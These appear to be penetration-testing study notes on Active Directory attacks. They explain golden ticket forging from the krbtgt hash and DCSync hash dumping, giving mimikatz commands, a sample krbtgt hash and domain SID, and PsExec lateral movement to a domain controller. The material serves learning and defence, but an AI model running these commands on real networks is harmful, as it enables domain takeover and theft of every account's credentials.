
### Golden Tickets

TGTs are encrypted with pw hash of the user krbtgt on KDC. If we know this hash, we can create our self made custom TGT/golden ticket.

Ex: Create ticket that non privileged user is a part of the Domain Admins Group. 
Login as an account from the Domain Admins group. Then run mimkatz command:
```
lsadump::lsa /patch  
kerberos::purge` # Delete existing Kerberos Tickets
Supply Domain SID with whoami /user
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt #krbtgt options to indicate we are supplying hash
misc::cmd # launch cmd
psexec.exe \\dc01 cmd.exe # lateral movement
```

By creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked


### Domain Controller Synchronization

There could me multiple domain controllers, when one asks for an update, it doesn't the update came from another Domain controller, it just checks if SID has proper privs. This means we can rogue update a DC.

```
lsadump::dcsync /user:Administrator # Asking user to sync
```
The dump contains multiple hashes associated with the last twenty-nine used user passwords as well as the hashes used with AES encryption.

Using the technique above, we can request a replication update with a domain controller and obtain the password hashes of every account in Active Directory without ever logging in to the domain controller